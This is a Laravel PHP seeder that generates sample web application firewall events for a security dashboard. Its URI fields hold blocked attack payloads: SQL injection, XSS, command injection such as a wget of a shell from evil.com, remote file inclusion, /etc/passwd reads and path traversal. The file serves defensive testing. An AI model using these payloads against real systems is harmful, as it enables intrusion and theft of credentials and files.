<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use App\Models\WafEvent;
use Carbon\Carbon;

class WafEventsSeeder extends Seeder
{
    /**
     * إنشاء 50 حدث WAF تجريبي
     */
    public function run(): void
    {
        $events = [
            // SQL Injection Attacks
            [
                'client_ip' => '203.0.113.45',
                'country' => 'CN',
                'host' => 'example.com',
                'uri' => '/products?id=1 UNION SELECT * FROM users--',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '942100',
                'severity' => 'CRITICAL',
                'message' => 'SQL Injection Attack Detected via libinjection',
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            ],
            [
                'client_ip' => '198.51.100.23',
                'country' => 'RU',
                'host' => 'example.com',
                'uri' => '/login?username=admin\' OR \'1\'=\'1',
                'method' => 'POST',
                'status' => 403,
                'rule_id' => '942110',
                'severity' => 'CRITICAL',
                'message' => 'SQL Injection Attack',
                'user_agent' => 'sqlmap/1.4.7',
            ],
            [
                'client_ip' => '192.0.2.100',
                'country' => 'US',
                'host' => 'example.com',
                'uri' => '/search?q=\' DROP TABLE users; --',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '942200',
                'severity' => 'CRITICAL',
                'message' => 'Detects MySQL comment-/space-obfuscated injections',
                'user_agent' => 'curl/7.68.0',
            ],
            
            // XSS Attacks
            [
                'client_ip' => '203.0.113.89',
                'country' => 'BR',
                'host' => 'example.com',
                'uri' => '/comment?text=<script>alert("XSS")</script>',
                'method' => 'POST',
                'status' => 403,
                'rule_id' => '941100',
                'severity' => 'HIGH',
                'message' => 'XSS Attack Detected via libinjection',
                'user_agent' => 'Mozilla/5.0 (X11; Linux x86_64)',
            ],
            [
                'client_ip' => '198.51.100.45',
                'country' => 'IN',
                'host' => 'example.com',
                'uri' => '/profile?bio=<img src=x onerror=alert(1)>',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '941110',
                'severity' => 'HIGH',
                'message' => 'XSS Filter - Category 1',
                'user_agent' => 'Mozilla/5.0 (Windows NT 6.1)',
            ],
            [
                'client_ip' => '192.0.2.67',
                'country' => 'GB',
                'host' => 'example.com',
                'uri' => '/feedback?message=<iframe src="javascript:alert(1)">',
                'method' => 'POST',
                'status' => 403,
                'rule_id' => '941120',
                'severity' => 'HIGH',
                'message' => 'XSS Filter - Category 2',
                'user_agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            ],
            
            // Remote Code Execution (RCE)
            [
                'client_ip' => '203.0.113.150',
                'country' => 'KP',
                'host' => 'example.com',
                'uri' => '/upload?file=; wget http://evil.com/shell.php',
                'method' => 'POST',
                'status' => 403,
                'rule_id' => '932100',
                'severity' => 'CRITICAL',
                'message' => 'Remote Command Execution: Unix Command Injection',
                'user_agent' => 'Python-urllib/3.8',
            ],
            [
                'client_ip' => '198.51.100.89',
                'country' => 'IR',
                'host' => 'example.com',
                'uri' => '/admin/exec?cmd=cat /etc/passwd',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '932110',
                'severity' => 'CRITICAL',
                'message' => 'Remote Command Execution: Unix Shell Code',
                'user_agent' => 'curl/7.64.1',
            ],
            
            // Path Traversal
            [
                'client_ip' => '192.0.2.123',
                'country' => 'VN',
                'host' => 'example.com',
                'uri' => '/download?file=../../etc/passwd',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '930100',
                'severity' => 'HIGH',
                'message' => 'Path Traversal Attack',
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0)',
            ],
            [
                'client_ip' => '203.0.113.78',
                'country' => 'PK',
                'host' => 'example.com',
                'uri' => '/files?path=../../../var/www/config.php',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '930110',
                'severity' => 'HIGH',
                'message' => 'Path Traversal Attack (/../)',
                'user_agent' => 'Wget/1.20.3',
            ],
            
            // Local File Inclusion (LFI)
            [
                'client_ip' => '198.51.100.200',
                'country' => 'BD',
                'host' => 'example.com',
                'uri' => '/page?include=/etc/passwd',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '930120',
                'severity' => 'CRITICAL',
                'message' => 'OS File Access Attempt',
                'user_agent' => 'Mozilla/5.0',
            ],
            
            // Remote File Inclusion (RFI)
            [
                'client_ip' => '192.0.2.156',
                'country' => 'NG',
                'host' => 'example.com',
                'uri' => '/load?file=http://evil.com/backdoor.txt',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '931100',
                'severity' => 'CRITICAL',
                'message' => 'Possible Remote File Inclusion (RFI) Attack',
                'user_agent' => 'Python-requests/2.25.1',
            ],
            
            // Protocol Attacks
            [
                'client_ip' => '203.0.113.201',
                'country' => 'TR',
                'host' => '192.168.1.1',
                'uri' => '/',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '920350',
                'severity' => 'WARNING',
                'message' => 'Host header is a numeric IP address',
                'user_agent' => 'Mozilla/5.0',
            ],
            
            // Scanner Detection
            [
                'client_ip' => '198.51.100.67',
                'country' => 'RO',
                'host' => 'example.com',
                'uri' => '/admin/login',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '913100',
                'severity' => 'NOTICE',
                'message' => 'Found User-Agent associated with security scanner',
                'user_agent' => 'Nikto/2.1.6',
            ],
            [
                'client_ip' => '192.0.2.90',
                'country' => 'UA',
                'host' => 'example.com',
                'uri' => '/.git/config',
                'method' => 'GET',
                'status' => 403,
                'rule_id' => '913110',
                'severity' => 'NOTICE',
                'message' => 'Found request filename/argument associated with security scanner',
                'user_agent' => 'nmap scripting engine',
            ],
            
            // Legitimate Traffic (200)
            [
                'client_ip' => '203.0.113.5',
                'country' => 'US',
                'host' => 'example.com',
                'uri' => '/',
                'method' => 'GET',
                'status' => 200,
                'rule_id' => null,
                'severity' => null,
                'message' => null,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ],
            [
                'client_ip' => '198.51.100.10',
                'country' => 'CA',
                'host' => 'example.com',
                'uri' => '/products',
                'method' => 'GET',
                'status' => 200,
                'rule_id' => null,
                'severity' => null,
                'message' => null,
                'user_agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            ],
            [
                'client_ip' => '192.0.2.50',
                'country' => 'GB',
                'host' => 'example.com',
                'uri' => '/about',
                'method' => 'GET',
                'status' => 200,
                'rule_id' => null,
                'severity' => null,
                'message' => null,
                'user_agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)',
            ],
            
            // 404 Not Found
            [
                'client_ip' => '203.0.113.99',
                'country' => 'DE',
                'host' => 'example.com',
                'uri' => '/wp-admin',
                'method' => 'GET',
                'status' => 404,
                'rule_id' => null,
                'severity' => null,
                'message' => null,
                'user_agent' => 'Mozilla/5.0',
            ],
            [
                'client_ip' => '198.51.100.150',
                'country' => 'FR',
                'host' => 'example.com',
                'uri' => '/phpMyAdmin',
                'method' => 'GET',
                'status' => 404,
                'rule_id' => null,
                'severity' => null,
                'message' => null,
                'user_agent' => 'zgrab/0.x',
            ],
        ];

        // إضافة المزيد من الأحداث لتصل إلى 50
        $additionalAttacks = [
            // More SQL Injection variations
            ['ip' => '203.0.113.111', 'country' => 'CN', 'uri' => '/api/user?id=1\' AND 1=1--', 'rule' => '942150', 'severity' => 'CRITICAL', 'msg' => 'SQL Injection Attack'],
            ['ip' => '198.51.100.112', 'country' => 'RU', 'uri' => '/search?q=1\'+OR+\'1\'=\'1', 'rule' => '942180', 'severity' => 'HIGH', 'msg' => 'SQL Injection - Tautology'],
            ['ip' => '192.0.2.113', 'country' => 'KP', 'uri' => '/products?cat=1 UNION ALL SELECT NULL--', 'rule' => '942200', 'severity' => 'CRITICAL', 'msg' => 'SQL Injection UNION'],
            
            // More XSS
            ['ip' => '203.0.113.114', 'country' => 'BR', 'uri' => '/comment?text=<svg onload=alert(1)>', 'rule' => '941130', 'severity' => 'HIGH', 'msg' => 'XSS via SVG'],
            ['ip' => '198.51.100.115', 'country' => 'IN', 'uri' => '/post?content=javascript:alert(1)', 'rule' => '941140', 'severity' => 'HIGH', 'msg' => 'XSS via javascript:'],
            ['ip' => '192.0.2.116', 'country' => 'PH', 'uri' => '/feedback?msg=<body onload=alert(1)>', 'rule' => '941150', 'severity' => 'HIGH', 'msg' => 'XSS via event handler'],
            
            // More RCE
            ['ip' => '203.0.113.117', 'country' => 'IR', 'uri' => '/exec?cmd=ls -la', 'rule' => '932115', 'severity' => 'CRITICAL', 'msg' => 'Unix Command Injection'],
            ['ip' => '198.51.100.118', 'country' => 'KP', 'uri' => '/run?cmd=whoami', 'rule' => '932120', 'severity' => 'CRITICAL', 'msg' => 'System Command Access'],
            ['ip' => '192.0.2.119', 'country' => 'SY', 'uri' => '/shell?c=id', 'rule' => '932130', 'severity' => 'CRITICAL', 'msg' => 'Shell Command Injection'],
            
            // Session Fixation
            ['ip' => '203.0.113.120', 'country' => 'VN', 'uri' => '/login?PHPSESSID=attacker_session', 'rule' => '943100', 'severity' => 'HIGH', 'msg' => 'Session Fixation Attack'],
            
            // LDAP Injection
            ['ip' => '198.51.100.121', 'country' => 'EG', 'uri' => '/search?user=*)(uid=*))(&(uid=*', 'rule' => '950100', 'severity' => 'HIGH', 'msg' => 'LDAP Injection Attack'],
            
            // XML Injection
            ['ip' => '192.0.2.122', 'country' => 'PK', 'uri' => '/api/xml', 'rule' => '973300', 'severity' => 'MEDIUM', 'msg' => 'Possible XPath Injection Attack'],
            
            // More Path Traversal
            ['ip' => '203.0.113.123', 'country' => 'BD', 'uri' => '/download?f=....//....//etc/passwd', 'rule' => '930100', 'severity' => 'HIGH', 'msg' => 'Path Traversal'],
            ['ip' => '198.51.100.124', 'country' => 'ID', 'uri' => '/file?path=..\\..\\windows\\system32', 'rule' => '930110', 'severity' => 'HIGH', 'msg' => 'Windows Path Traversal'],
            
            // Scanners
            ['ip' => '192.0.2.125', 'country' => 'UA', 'uri' => '/admin/', 'rule' => '913100', 'severity' => 'NOTICE', 'msg' => 'Security Scanner Detected', 'ua' => 'Acunetix'],
            ['ip' => '203.0.113.126', 'country' => 'RO', 'uri' => '/.env', 'rule' => '913110', 'severity' => 'WARNING', 'msg' => 'Sensitive File Access', 'ua' => 'masscan'],
            ['ip' => '198.51.100.127', 'country' => 'BG', 'uri' => '/config.php.bak', 'rule' => '913120', 'severity' => 'WARNING', 'msg' => 'Backup File Access'],
            
            // More Legitimate
            ['ip' => '192.0.2.20', 'country' => 'US', 'uri' => '/blog', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 200],
            ['ip' => '203.0.113.21', 'country' => 'CA', 'uri' => '/contact', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 200],
            ['ip' => '198.51.100.22', 'country' => 'AU', 'uri' => '/services', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 200],
            ['ip' => '192.0.2.23', 'country' => 'NZ', 'uri' => '/pricing', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 200],
            ['ip' => '203.0.113.24', 'country' => 'GB', 'uri' => '/api/health', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 200],
            
            // More 404s
            ['ip' => '198.51.100.25', 'country' => 'DE', 'uri' => '/old-page', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 404],
            ['ip' => '192.0.2.26', 'country' => 'FR', 'uri' => '/missing.php', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 404],
            ['ip' => '203.0.113.27', 'country' => 'IT', 'uri' => '/robots.txt.old', 'rule' => null, 'severity' => null, 'msg' => null, 'status' => 404],
            
            // Repeated attacks from same IP (pattern detection)
            ['ip' => '198.51.100.200', 'country' => 'CN', 'uri' => '/login?user=admin\' OR 1=1--', 'rule' => '942100', 'severity' => 'CRITICAL', 'msg' => 'SQL Injection'],
            ['ip' => '198.51.100.200', 'country' => 'CN', 'uri' => '/api?id=1 UNION SELECT', 'rule' => '942110', 'severity' => 'CRITICAL', 'msg' => 'SQL Injection'],
            ['ip' => '198.51.100.200', 'country' => 'CN', 'uri' => '/search?q=<script>alert(1)</script>', 'rule' => '941100', 'severity' => 'HIGH', 'msg' => 'XSS Attack'],
            ['ip' => '198.51.100.200', 'country' => 'CN', 'uri' => '/admin/exec?cmd=ls', 'rule' => '932100', 'severity' => 'CRITICAL', 'msg' => 'RCE Attempt'],
            
            // Brute force attempts
            ['ip' => '192.0.2.250', 'country' => 'RU', 'uri' => '/login', 'rule' => null, 'severity' => null, 'msg' => 'Failed login attempt', 'status' => 401],
            ['ip' => '192.0.2.250', 'country' => 'RU', 'uri' => '/login', 'rule' => null, 'severity' => null, 'msg' => 'Failed login attempt', 'status' => 401],
            ['ip' => '192.0.2.250', 'country' => 'RU', 'uri' => '/login', 'rule' => null, 'severity' => null, 'msg' => 'Failed login attempt', 'status' => 401],
        ];

        // إضافة الأحداث الرئيسية
        foreach ($events as $event) {
            $this->createEvent($event);
        }

        // إضافة الأحداث الإضافية
        foreach ($additionalAttacks as $attack) {
            $this->createEvent([
                'client_ip' => $attack['ip'],
                'country' => $attack['country'],
                'host' => 'example.com',
                'uri' => $attack['uri'],
                'method' => 'GET',
                'status' => $attack['status'] ?? 403,
                'rule_id' => $attack['rule'],
                'severity' => $attack['severity'],
                'message' => $attack['msg'],
                'user_agent' => $attack['ua'] ?? 'Mozilla/5.0',
            ]);
        }

        $this->command->info('✅ تم إضافة 50 حدث WAF تجريبي بنجاح!');
    }

    /**
     * إنشاء حدث WAF
     */
    private function createEvent(array $data): void
    {
        // وقت عشوائي خلال آخر 24 ساعة
        $hoursAgo = rand(0, 23);
        $minutesAgo = rand(0, 59);
        
        WafEvent::create([
            'event_time' => Carbon::now()->subHours($hoursAgo)->subMinutes($minutesAgo),
            'client_ip' => $data['client_ip'],
            'country' => $data['country'] ?? null,
            'host' => $data['host'],
            'uri' => $data['uri'],
            'method' => $data['method'] ?? 'GET',
            'status' => $data['status'],
            'rule_id' => $data['rule_id'],
            'severity' => $data['severity'],
            'message' => $data['message'],
            'user_agent' => $data['user_agent'],
            'unique_id' => uniqid('waf_', true),
        ]);
    }
}
